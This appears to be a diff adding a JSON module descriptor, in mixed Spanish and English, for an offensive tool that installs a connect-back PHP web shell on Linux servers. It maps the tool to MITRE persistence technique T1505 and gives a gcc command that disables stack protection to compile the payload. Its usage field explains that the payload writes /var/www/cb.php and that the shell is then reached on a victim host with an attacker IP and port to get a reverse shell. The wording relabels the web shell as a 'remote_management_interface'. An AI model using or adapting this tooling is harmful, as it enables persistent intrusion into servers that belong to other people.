@@ -1,0 +1,22 @@
+{
+  "module_id": "LINUX-PHP-WEBSHELL-WRITER-V5",
+  "name": "Linux PHP Connect Back Web Shell Writer Optimized_Profile (Grayscale Research)",
+  "priority": "HIGH",
+  "tactic": "TA0003_Persistence",
+  "technique": "T1505",
+  "dependencies": ["gcc", "linux-target"],
+  "targeting_intel": {
+    "os_family": "Linux",
+    "affected_versions": ["Linux (x86)"],
+    "vulnerability": "Web Server / File System Write Access",
+    "hcg_scenario": "Optimized_Profile de 508 bytes que cuando se ejecuta, abre /var/www/cb.php y escribe una remote_management_interface PHP de conexión inversa (connect back) en el sistema de archivos."
+  },
+  "execution_config": {
+    "command": "gcc -m32 -fno-stack-protector -z execstack sigv5_t1505_linux_php_remote_management_interface_writer.c -o sigv5_t1505_linux_php_remote_management_interface_writer",
+    "usage": "Compilar para Linux x86. Tras la ejecución, se acceder a la remote_management_interface en el servidor víctima (ej: http://vulnhost/cb.php?host=<attacker_ip>&port=777) para obtener una shell inversa."
+  },
+  "impact": {
+    "auth_level": "Requires write access to web root (e.g. www-data or root)",
+    "action": "Web Shell Installation (Server Software Component)"
+  }
+}
